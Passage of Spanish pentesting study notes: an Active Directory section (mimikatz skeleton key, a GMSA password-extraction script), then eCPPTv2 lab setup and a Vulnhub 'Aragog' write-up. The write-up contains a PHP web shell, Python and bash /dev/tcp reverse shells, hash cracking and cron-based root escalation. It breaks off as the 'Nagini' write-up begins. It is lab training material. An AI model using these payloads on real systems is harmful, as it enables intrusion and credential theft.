<p>De acuerdo a lo antes mencionado, el timestamp es cifrado con el hash NT de los usuarios. El domain controller después intenta descifrar el timestamp con el hash NT del usuario, una vez que la skeleton key sea implantada en el domain controller trata de decifrar el timestamp usando el hash NT del usuario y el hash NT de la skeleton key permitiendo el acceso al domain forest.</p>
<h5 id="ejecución-7"><a class="header" href="#ejecución-7">Ejecución</a></h5>
<p><code>misc::skeleton</code></p>
<p>TODO: evidencia</p>
<h4 id="abusando-de-aclsaces"><a class="header" href="#abusando-de-aclsaces">Abusando de ACLs/ACEs</a></h4>
<h5 id="readgmsapassword"><a class="header" href="#readgmsapassword">ReadGMSAPassword</a></h5>
<p>Un atacante puede leer la contraseña GMSA para la cuenta que es aplicada la ACE.</p>
<pre><code class="language-powershell"># Save the blob to a variable
$gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

# Decode the data structure using the DSInternals module
ConvertFrom-ADManagedPasswordBlob $mp
# Build a NT-Hash for PTH
(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
# Alterantive: build a Credential-Object with the Plain Password
$cred = new-object system.management.automation.PSCredential &quot;Domain\Target_Account&quot;,(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
# Visualizar la contraseña en texto claro
ConvertTo-SecureString $mp -AsPlainText -Force
</code></pre>
<h2 id="referencias-2"><a class="header" href="#referencias-2">Referencias</a></h2>
<ul>
<li><a href="https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)</a>.</li>
<li><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">NTLM relaying and Kerberos delegation</a>.</li>
<li><a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">PowerView CheatSheet</a>.</li>
<li><a href="https://medium.com/@Shorty420/kerberoasting-9108477279cc">Kerberoasting your way in</a>.</li>
<li><a href="https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/">Pentesting in the Real World: Group Policy Pwnage</a>.</li>
<li><a href="https://github.com/srrequiem/SecNotes/blob/main/HTB/Boxes/Windows/1_Easy/Active/htb_active.md">Ejercicio GPP - HTB Active</a>.</li>
<li><a href="https://tryhackme.com/room/attackingkerberos">Attacking Kerberos - TryHackMe</a></li>
<li><a href="https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a">Pass-The-Ticket (PTT) attack in Mimikatz (and a Gotcha!)</a></li>
<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat">AS-REP Roasting</a></li>
<li><a href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">Kerberoasting Revisited</a></li>
<li><a href="https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a></li>
<li><a href="https://www.varonis.com/blog/kerberos-authentication-explained">Kerberos Authentication Explained</a></li>
<li><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don&#x27;t-Get-It-wp.pdf">Abusing Kerberos</a></li>
<li><a href="https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf">Kerberos &amp; Attacks 101</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword">ReadGMSAPassword</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ecpptv2-lab"><a class="header" href="#ecpptv2-lab">eCPPTv2 Lab</a></h1>
<p>https://www.youtube.com/watch?v=Q7UeWILja-g</p>
<p><img src="guides/ecpptv2_lab/images/ecppt_lab.jpg" alt="Diagrama de laboratorio" /></p>
<h2 id="descargas-de-máquinas-de-vulnhub"><a class="header" href="#descargas-de-máquinas-de-vulnhub">Descargas de máquinas de Vulnhub</a></h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/harrypotter-aragog-102,688/">Descargar máquina Aragog</a></li>
<li><a href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">Descargar máquina Nagini</a></li>
<li><a href="https://www.vulnhub.com/entry/harrypotter-fawkes,686/">Descargar máquina Fawkes</a></li>
<li><a href="https://www.vulnhub.com/entry/matrix-1,259/">Descargar máquina Matrix 1</a></li>
<li><a href="https://www.vulnhub.com/entry/brainpan-1,51/">Descargar máquina Brainpan</a></li>
</ul>
<h2 id="setup"><a class="header" href="#setup">Setup</a></h2>
<p>Es probable que las máquinas no den IP dado que por defecto están configuradas a ser importadas en virtualbox por lo que hay que realizar los siguientes pasos para su configuración:</p>
<ol>
<li>Encender máquina y en la pantalla del GRUB presionar la tecla <code>e</code>.</li>
<li>Buscar la línea (ejemplo):</li>
</ol>
<pre><code class="language-text">linux /boot/vmlinuz-1234-amd64 root=UID-fffff-ad-1234 ro quiet
</code></pre>
<p>Cambiar por:</p>
<pre><code class="language-text">linux /boot/vmlinuz-1234-amd64 root=UID-fffff-ad-1234 rw init=/bin/bash
</code></pre>
<ol start="3">
<li>Presionar <code>F10</code> y esperar reinicio de máquina.</li>
<li>Verificar con <code>ip a</code> nombre de la interfaz.</li>
<li>Agregar en <code>/etc/network/interfaces</code> lo siguiente por cada interfaz:</li>
</ol>
<pre><code class="language-text">auto &lt;interfaz&gt;
allow-hotplug &lt;interfaz&gt;
iface &lt;interfaz&gt; inet dhcp
</code></pre>
<ol start="6">
<li>Eliminar de <code>/etc/network/interfaces</code> interfaces que no se encuentren listadas en <code>ip a</code>.</li>
<li>Guardar y reiniciar.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="aragog"><a class="header" href="#aragog">Aragog</a></h1>
<p>Write-up de la máquina aragog de la plataforma <a href="https://www.vulnhub.com">vulnhub</a> (en un ejercicio de laboratorio para eCPPTv2).</p>
<p><img src="guides/ecpptv2_lab/1_aragog/images/cover.jpg" alt="Aragog cover" /></p>
<h2 id="tabla-de-contenido-2"><a class="header" href="#tabla-de-contenido-2">Tabla de Contenido <!-- omit from toc --></a></h2>
<ul>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#introducci%C3%B3n">Introducción</a>
<ul>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#t%C3%A9cnicas-vistas--tags">Técnicas vistas / Tags</a></li>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#estad%C3%ADsticas">Estadísticas</a></li>
</ul>
</li>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#reconocimiento">Reconocimiento</a>
<ul>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#escaneo-de-host">Escaneo de host</a>
<ul>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#escaneo-completo-de-puertos">Escaneo completo de puertos</a></li>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#escaneo-espec%C3%ADfico">Escaneo específico</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#enumeraci%C3%B3n">Enumeración</a>
<ul>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#servicios">Servicios</a>
<ul>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#http---80">http - 80</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#explotaci%C3%B3n">Explotación</a>
<ul>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#pasos-previos--preparaci%C3%B3n">Pasos previos | Preparación</a></li>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#ejecuci%C3%B3n">Ejecución</a></li>
</ul>
</li>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#post-explotaci%C3%B3n">Post Explotación</a>
<ul>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#enumeraci%C3%B3n-1">Enumeración</a></li>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#escalaci%C3%B3n-de-privilegios">Escalación de privilegios</a>
<ul>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#www-data--hagrid98">www-data → hagrid98</a></li>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#hagrid98--root">hagrid98 → root</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="guides/ecpptv2_lab/1_aragog/index.html#referencias">Referencias</a></li>
</ul>
<h2 id="introducción"><a class="header" href="#introducción">Introducción</a></h2>
<h3 id="técnicas-vistas--tags"><a class="header" href="#técnicas-vistas--tags">Técnicas vistas / Tags</a></h3>
<ul>
<li>Wordpress plugin wp-file-manager exploit.</li>
<li>CVE-2020-25213.</li>
<li>Abuso de cronjob.</li>
</ul>
<h3 id="estadísticas"><a class="header" href="#estadísticas">Estadísticas</a></h3>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.vulnhub.com/entry/harrypotter-aragog-102,688/">Aragog</a></td></tr>
<tr><td>OS</td><td>Linux</td></tr>
<tr><td>Dificultad asignada</td><td>Fácil</td></tr>
<tr><td>Creadores</td><td><a href="https://www.vulnhub.com/author/mansoor-r,794/">Mansoor R</a></td></tr>
</tbody></table>
</div>
<h2 id="reconocimiento"><a class="header" href="#reconocimiento">Reconocimiento</a></h2>
<h3 id="escaneo-de-host"><a class="header" href="#escaneo-de-host">Escaneo de host</a></h3>
<h4 id="escaneo-completo-de-puertos"><a class="header" href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></h4>
<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -v -p- -open -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-05 22:16 EST
Initiating ARP Ping Scan at 22:16
Scanning 192.168.111.175 [1 port]
Completed ARP Ping Scan at 22:16, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:16
Scanning 192.168.111.175 [65535 ports]
Discovered open port 80/tcp on 192.168.111.175
Discovered open port 22/tcp on 192.168.111.175
Completed SYN Stealth Scan at 22:16, 1.09s elapsed (65535 total ports)
Nmap scan report for 192.168.111.175
Host is up (0.000046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:18:3F:A9 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
</code></pre>
<h4 id="escaneo-específico"><a class="header" href="#escaneo-específico">Escaneo específico</a></h4>
<pre><code class="language-bash">└─$ nmap -sCV -p 80,22 -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-05 22:16 EST
Nmap scan report for 192.168.111.175
Host is up (0.00027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds
</code></pre>
<h2 id="enumeración-1"><a class="header" href="#enumeración-1">Enumeración</a></h2>
<h3 id="servicios"><a class="header" href="#servicios">Servicios</a></h3>
<h4 id="http---80"><a class="header" href="#http---80">http - 80</a></h4>
<p>Después de la ejecución de <code>ffuf</code> se identificó la ruta <code>/blog</code>, al navegarla se visualizó  que se trataba de un sitio en Wordpress. Por lo que posteriormente se ejecutó <code>wpscan</code> para enumerar el sitio.</p>
<pre><code class="language-bash">└─$ wpscan --url http://192.168.111.175/blog/ --force --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.111.175/blog/ [192.168.111.175]
[+] Started: Mon Mar  6 09:29:19 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.111.175/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.111.175/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.111.175/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-14).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.111.175/blog/, Match: '-release.min.js?ver=5.0.12'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.111.175/blog/, Match: 'WordPress 5.0.12'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:06 &lt;=======================================================================&gt; (102457 / 102457) 100.00% Time: 00:01:06
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.111.175/blog/wp-content/plugins/akismet/
 | Latest Version: 5.0.2
 | Last Updated: 2022-12-01T17:18:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.111.175/blog/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] wp-file-manager
 | Location: http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/
 | Last Updated: 2023-02-08T10:32:00.000Z
 | Readme: http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/readme.txt
 | [!] The version is out of date, the latest version is 7.1.8
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/, status: 200
 |
 | Version: 6.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 &lt;==============================================================================&gt; (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Mar  6 09:30:39 2023
[+] Requests Done: 102637
[+] Cached Requests: 8
[+] Data Sent: 28.722 MB
[+] Data Received: 26.056 MB
[+] Memory used: 383.711 MB
[+] Elapsed time: 00:01:20
</code></pre>
<p>Dada la información recopilada se buscaron vulnerabilidades de los plugins identificados encontrado el CVE-2020-25213 en <code>wp-file-manager</code>.</p>
<h2 id="explotación"><a class="header" href="#explotación">Explotación</a></h2>
<h4 id="pasos-previos--preparación"><a class="header" href="#pasos-previos--preparación">Pasos previos | Preparación</a></h4>
<p>Se encontró un <a href="https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213/blob/main/wp-file-manager-exploit.sh">exploit público</a> para validar la vulnerabilidad y explotarla. Previamente preparando el siguiente código en php para ejecutar comandos en la máquina, dado que la vulnerabilidad permite subir archivos.</p>
<pre><code class="language-php">&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;
</code></pre>
<h4 id="ejecución-8"><a class="header" href="#ejecución-8">Ejecución</a></h4>
<pre><code class="language-bash">└─$ bash exp.sh --wp_url http://192.168.111.175/blog -f $(pwd)/evil.php --verbose

============================================================================================
wp-file-manager wordpress plugin Unauthenticated RCE Exploit    By: Mansoor R (@time4ster)
============================================================================================

curl POC :
curl -ks --max-time 5 --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36&quot; -F &quot;reqid=17457a1fe6959&quot; -F &quot;cmd=upload&quot; -F &quot;target=l1_Lw&quot;  -F &quot;mtime[]=1576045135&quot; -F &quot;upload[]=@//home/srrequiem/Documents/ecpptv2_lab/1_aragog/exploits/evil.php&quot; &quot;http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;

[+] W00t! W00t! File uploaded successfully.
Location:  /blog/wp-content/plugins/wp-file-manager/lib/php/../files/evil.php
</code></pre>
<p>Accediendo a la url por medio de la url <code>http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/lib/files/evil.php</code> permitiendo entablar una reverse shell con:</p>
<pre><code class="language-text">http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/lib/files/evil.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.111.162%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
</code></pre>
<h2 id="post-explotación-1"><a class="header" href="#post-explotación-1">Post Explotación</a></h2>
<h3 id="enumeración-2"><a class="header" href="#enumeración-2">Enumeración</a></h3>
<p>Posteriormente, al intentar acceder a la base de datos disponible con las credenciales dentro de <code>/usr/share/wordpress/wp-config.php</code> y fallar, se intentó con las que se encuentran de ejemplo en los sitios de wordpress <code>/etc/wordpress/config-default.php</code>.</p>
<pre><code class="language-bash">&lt;?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?&gt;
</code></pre>
<p>Obteniendo así acceso a la base de datos y pudiendo visualizar la lista de usuarios y hashes que se encuentran registrados en wordpress, coincidiendo en que el usuario <code>hagrid98</code> es también usuario de sistema.</p>
<pre><code class="language-bash">MariaDB [wordpress]&gt; select user_login,user_pass from wp_users;
select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. |
+------------+------------------------------------+
1 row in set (0.001 sec)
</code></pre>
<h3 id="escalación-de-privilegios"><a class="header" href="#escalación-de-privilegios">Escalación de privilegios</a></h3>
<h4 id="www-data--hagrid98"><a class="header" href="#www-data--hagrid98">www-data → hagrid98</a></h4>
<p>Al obtener el hash de la contraseña se hizo uso de <code>john</code> para crackearla y poder escalar como ese usuario.</p>
<pre><code class="language-bash">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hagrid98.hash
Created directory: /home/srrequiem/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2023-03-06 12:59) 25.00g/s 38400p/s 38400c/s 38400C/s 753951..mexico1
Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably
Session completed.
</code></pre>
<p>Permitiendo el logueo con este usuario y acceso al primer horrocrux.</p>
<pre><code class="language-bash">hagrid98@Aragog:~$ cat horcrux1.txt
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
hagrid98@Aragog:~$ echo 'MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==' | base64 -d &amp;&amp; echo
1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
</code></pre>
<h4 id="hagrid98--root"><a class="header" href="#hagrid98--root">hagrid98 → root</a></h4>
<p>Como parte de la enumeración se encontró dentro de <code>/opt</code> un archivo <code>.sh</code> que realiza una copia a la carpeta <code>/tmp</code>, lo cuál dado que se puede modificar con el usuario obtenido, se puede posteriormente corroborar si está siendo ejecutado de alguna manera.</p>
<pre><code class="language-bash">hagrid98@Aragog:~$ ls -la /opt/
total 12
drwxr-xr-x  2 root     root     4096 Apr  1  2021 .
drwxr-xr-x 18 root     root     4096 Mar 31  2021 ..
-rwxr-xr-x  1 hagrid98 hagrid98  132 Feb  6 10:23 .backup.sh
hagrid98@Aragog:~$ cat /opt/.backup.sh
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
/bin/bash -i &gt;&amp; /dev/tcp/192.168.111.162/4321 0&gt;&amp;1
</code></pre>
<p>Para corroborar si el script está siendo ejecutado se ejecutó <a href="https://github.com/DominicBreuker/pspy">pspy</a>, identificando así que está siendo ejecutado por el usuario <code>root</code>. Bastaría con añadir el comando que se desee (como una reverse shell) para escalar al usuario <code>root</code>.</p>
<pre><code class="language-bash">2023/03/07 04:03:10 CMD: UID=0    PID=1      | /sbin/init
2023/03/07 04:04:01 CMD: UID=0    PID=2367   | /usr/sbin/CRON -f
2023/03/07 04:04:01 CMD: UID=0    PID=2368   | /usr/sbin/CRON -f
2023/03/07 04:04:01 CMD: UID=0    PID=2369   | /bin/sh -c bash -c &quot;/opt/.backup.sh&quot;
2023/03/07 04:04:01 CMD: UID=0    PID=2370   | /bin/bash /opt/.backup.sh
</code></pre>
<p>Ejecutando por ejemplo:</p>
<pre><code class="language-bash">hagrid98@Aragog:~$ echo 'bash -i &gt;&amp; /dev/tcp/192.168.111.162/443 0&gt;&amp;1' &gt;&gt; /opt/.backup.sh &amp;&amp; cat /opt/.backup.sh
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
bash -i &gt;&amp; /dev/tcp/192.168.111.162/443 0&gt;&amp;1
</code></pre>
<p>Permitiendo establecer una conexión y el segundo horrocrux.</p>
<pre><code class="language-bash">└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.111.162] from (UNKNOWN) [192.168.111.175] 45738
bash: cannot set terminal process group (2516): Inappropriate ioctl for device
bash: no job control in this shell
root@Aragog:~# ls -la
ls -la
total 40
drwx------  5 root root     4096 Feb  6 10:31 .
drwxr-xr-x 18 root root     4096 Mar 31  2021 ..
-rw-------  1 root root      802 Feb  7 08:29 .bash_history
-rw-r--r--  1 root root      570 Jan 31  2010 .bashrc
drwx------  3 root root     4096 Mar 31  2021 .gnupg
-rw-r--r--  1 root hagrid98  818 Apr  1  2021 horcrux2.txt
drwxr-xr-x  3 root root     4096 Feb  6 02:02 .local
-rw-r--r--  1 root root      148 Aug 17  2015 .profile
-rw-r--r--  1 root root       74 Mar 31  2021 .selected_editor
drwx------  2 root root     4096 Feb  6 10:26 .ssh
root@Aragog:~# cat horcrux2.txt
cat horcrux2.txt
  ____                            _         _       _   _
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
</code></pre>
<h2 id="referencias-3"><a class="header" href="#referencias-3">Referencias</a></h2>
<ul>
<li><a href="https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213/blob/main/wp-file-manager-exploit.sh">Exploit CVE-2020-25213</a>.</li>
<li><a href="https://github.com/DominicBreuker/pspy">pspy - unprivileged Linux process snooping</a>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="nagini"><a class="header" href="#nagini">Nagini</a></h1>
<p>Write-up de la máquina nagini de la plataforma <a href="https://www.vulnhub.com">vulnhub</a> (en un ejercicio de laboratorio para eCPPTv2).</p>
<p><img src="guides/ecpptv2_lab/2_nagini/images/cover.jpg" alt="Nagini cover" /></p>
<h2 id="tabla-de-contenido-3"><a class="header" href="#tabla-de-contenido-3">Tabla de Contenido <!-- omit from toc --></a></h2>
<ul>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#introducci%C3%B3n">Introducción</a>
<ul>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#t%C3%A9cnicas-vistas--tags">Técnicas vistas / Tags</a></li>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#estad%C3%ADsticas">Estadísticas</a></li>
</ul>
</li>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#reconocimiento">Reconocimiento</a>
<ul>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#escaneo-de-host">Escaneo de host</a>
<ul>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#escaneo-completo-de-puertos">Escaneo completo de puertos</a></li>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#escaneo-espec%C3%ADfico">Escaneo específico</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#enumeraci%C3%B3n">Enumeración</a>
<ul>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#servicios">Servicios</a>
<ul>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#http---80">http - 80</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#explotaci%C3%B3n">Explotación</a>
<ul>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#ssrf">SSRF</a></li>
</ul>
</li>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#post-explotaci%C3%B3n">Post Explotación</a>
<ul>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#escalaci%C3%B3n-de-privilegios">Escalación de privilegios</a>
<ul>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#www-data--snape">www-data → snape</a></li>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#www-data--hermoine">www-data → hermoine</a></li>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#hermoine--root">hermoine → root</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#notas-adicionales">Notas adicionales</a></li>
<li><a href="guides/ecpptv2_lab/2_nagini/index.html#referencias">Referencias</a></li>
</ul>
<h2 id="introducción-1"><a class="header" href="#introducción-1">Introducción</a></h2>
<h3 id="técnicas-vistas--tags-1"><a class="header" href="#técnicas-vistas--tags-1">Técnicas vistas / Tags</a></h3>
<ul>
<li>Joomla</li>
<li>HTTP3</li>
<li>quic</li>
<li>SSRF - Server Side Request Forgery</li>
<li>gopher</li>
<li>SUID cp</li>
<li>firepwd</li>
<li>Firefox password cracking</li>
</ul>
<h3 id="estadísticas-1"><a class="header" href="#estadísticas-1">Estadísticas</a></h3>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">Nagini</a></td></tr>
<tr><td>OS</td><td>Linux</td></tr>
<tr><td>Dificultad asignada</td><td>Media</td></tr>
<tr><td>Creadores</td><td><a href="https://www.vulnhub.com/author/mansoor-r,794/">Mansoor R</a></td></tr>
</tbody></table>
</div>
<h2 id="reconocimiento-1"><a class="header" href="#reconocimiento-1">Reconocimiento</a></h2>
<h3 id="escaneo-de-host-1"><a class="header" href="#escaneo-de-host-1">Escaneo de host</a></h3>
<h4 id="escaneo-completo-de-puertos-1"><a class="header" href="#escaneo-completo-de-puertos-1">Escaneo completo de puertos</a></h4>
<pre><code class="language-bash">subnet=&quot;10.10.0.&quot; &amp;&amp; for ip in {0..254}; do ping -c 1 -t 1 $subnet$ip &gt; /dev/null &amp;&amp; echo &quot;[+] Host found $subnet$ip&quot;; done
[+] Host found 10.10.0.128 # Aragog
[+] Host found 10.10.0.129

